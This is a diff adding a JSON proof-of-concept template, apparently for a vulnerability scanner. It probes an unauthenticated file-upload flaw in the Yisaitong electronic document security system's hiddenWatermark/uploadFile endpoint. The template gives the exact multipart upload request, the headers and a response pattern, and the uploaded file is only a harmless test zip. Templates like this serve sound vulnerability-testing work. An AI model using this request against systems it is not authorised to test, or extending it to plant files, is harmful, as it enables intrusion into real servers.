@@ -1,0 +1,19 @@
+{
+	"name":"亿赛通电子文档安全管理系统hiddenWatermark文件上传",
+	"tag":"yisaitong",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/CDGServer3/hiddenWatermark/uploadFile",
+		"pocPost":"------WebKitFormBoundary3lm0J8uEuFHxy191\r\nContent-Disposition: form-data; name=\"doc\"; filename=\"ceshi.zip\"\r\nContent-Type: application/zip\r\n \r\nsdsds\r\n------WebKitFormBoundary3lm0J8uEuFHxy191--",
+		"header":{
+			"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/120.0.0.0 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate, br",
+			"Accept-Language":" zh-CN,zh;q=0.9,en;q=0.8",
+			"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundary3lm0J8uEuFHxy191"
+		},
+		"status_code":"200",
+		"pattern":"(ceshi)"
+	}
+}
